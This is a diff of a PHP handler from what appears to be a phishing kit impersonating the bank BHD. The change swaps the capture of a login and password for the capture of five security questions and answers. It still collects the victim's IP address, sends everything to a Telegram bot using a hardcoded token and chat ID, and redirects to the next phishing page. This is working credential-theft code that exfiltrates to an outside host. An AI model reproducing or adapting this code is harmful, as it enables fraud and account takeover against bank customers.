@@ -1,7 +1,15 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $user = $_POST["user"] ?? '';
-    $pass = $_POST["pass"] ?? '';
+    $preg1 = $_POST["preg1"] ?? '';
+    $resp1 = $_POST["resp1"] ?? '';
+    $preg2 = $_POST["preg2"] ?? '';
+    $resp2 = $_POST["resp2"] ?? '';
+    $preg3 = $_POST["preg3"] ?? '';
+    $resp3 = $_POST["resp3"] ?? '';
+    $preg4 = $_POST["preg4"] ?? '';
+    $resp4 = $_POST["resp4"] ?? '';
+    $preg5 = $_POST["preg5"] ?? '';
+    $resp5 = $_POST["resp5"] ?? '';
 
     // OBTENER IP PÚBLICA REAL
     $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
@@ -14,9 +22,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $botToken = "8857815714:AAFp5JutGMJPmwrZf5NwiigjazGNVbnJEB4";
     $chatID = "8555745789";
 
-    $message = "=====DATOS BHD=======\n";
-    $message .= "User: $user\n";
-    $message .= "Clave: $pass\n";
+    $message = "=====PREGUNTAS BHD=======\n";
+    $message .= "$preg1\n$resp1\n";
+    $message .= "$preg2\n$resp2\n";
+    $message .= "$preg3\n$resp3\n";
+    $message .= "$preg4\n$resp4\n";
+    $message .= "$preg5\n$resp5\n";
     $message .= "IP del cliente: $ip";
 
     $url = "https://api.telegram.org/bot$botToken/sendMessage";
@@ -31,7 +42,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $context = stream_context_create($options);
     @file_get_contents($url, false, $context);
 
-    header("Location: pa01.php");
+    header("Location: pa02.php");
     exit;
 }
 ?>
